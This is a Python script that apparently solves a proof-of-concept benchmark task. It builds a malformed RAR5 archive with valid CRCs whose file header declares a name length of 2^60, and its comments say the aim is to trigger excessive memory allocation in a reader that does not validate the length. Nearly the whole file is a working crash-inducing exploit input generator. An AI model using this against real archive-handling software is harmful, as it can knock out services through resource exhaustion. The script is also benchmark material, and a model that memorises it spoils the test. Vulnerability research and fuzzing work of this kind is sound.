import zlib
from typing import Optional


def _vint(n: int) -> bytes:
    if n < 0:
        raise ValueError("vint expects non-negative")
    out = bytearray()
    while True:
        b = n & 0x7F
        n >>= 7
        if n:
            out.append(b | 0x80)
        else:
            out.append(b)
            break
    return bytes(out)


def _le32(n: int) -> bytes:
    return int(n & 0xFFFFFFFF).to_bytes(4, "little", signed=False)


def _build_rar5_block(block_type: int, block_flags: int, header_fields: bytes, extra: bytes = b"", data: bytes = b"") -> bytes:
    # RAR5 block header:
    #   CRC32 (4 bytes, LE) of the remainder of the header (starting from HEAD_SIZE vint)
    #   HEAD_SIZE (vint): size of the header starting from HEAD_SIZE field itself
    #   HEAD_TYPE (vint)
    #   HEAD_FLAGS (vint)
    #   Optional: EXTRA_SIZE (vint) if flags&0x0001
    #   Optional: DATA_SIZE (vint) if flags&0x0002
    #   Header-specific fields...
    #   Extra area bytes...
    #   Data area bytes...

    TYPE = _vint(block_type)
    FLAGS = _vint(block_flags)

    body_wo_size = bytearray()
    body_wo_size += TYPE
    body_wo_size += FLAGS

    if block_flags & 0x0001:
        body_wo_size += _vint(len(extra))
    if block_flags & 0x0002:
        body_wo_size += _vint(len(data))

    body_wo_size += header_fields
    body_wo_size += extra

    # HEAD_SIZE includes itself; iteratively stabilize vint length.
    size_v = b"\x00"
    while True:
        total = len(size_v) + len(body_wo_size)
        new_size_v = _vint(total)
        if len(new_size_v) == len(size_v):
            size_v = new_size_v
            break
        size_v = new_size_v

    header_no_crc = bytes(size_v) + bytes(body_wo_size)
    crc = zlib.crc32(header_no_crc) & 0xFFFFFFFF
    return _le32(crc) + header_no_crc + data


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Minimal RAR5 archive structure: signature + main header + file header with huge name size.
        # Goal: trigger excessive allocation when reading file name before validating its maximum length.
        signature = b"Rar!\x1a\x07\x01\x00"

        # Main header (type=1): minimal archive flags = 0.
        main_header_fields = _vint(0)
        main_block = _build_rar5_block(1, 0, main_header_fields)

        # File header (type=2): minimal mandatory fields with huge name size.
        # Fields (common RAR5 file header layout used by readers):
        #   file_flags (vint)
        #   unpacked_size (vint)
        #   attributes (vint)
        #   compression_info (vint)
        #   host_os (vint)
        #   name_size (vint)
        #   name bytes...
        # Use HAS_DATA flag with 0 data_size to match typical file headers.
        huge_name_size = 1 << 60
        file_header_fields = b"".join([
            _vint(0),          # file_flags
            _vint(0),          # unpacked_size
            _vint(0),          # attributes
            _vint(0),          # compression_info
            _vint(0),          # host_os
            _vint(huge_name_size),  # name_size (huge)
        ])
        file_block = _build_rar5_block(2, 0x0002, file_header_fields, data=b"")

        # Add a few trailing bytes to avoid corner cases with immediate EOF handling.
        return signature + main_block + file_block + b"\x00" * 16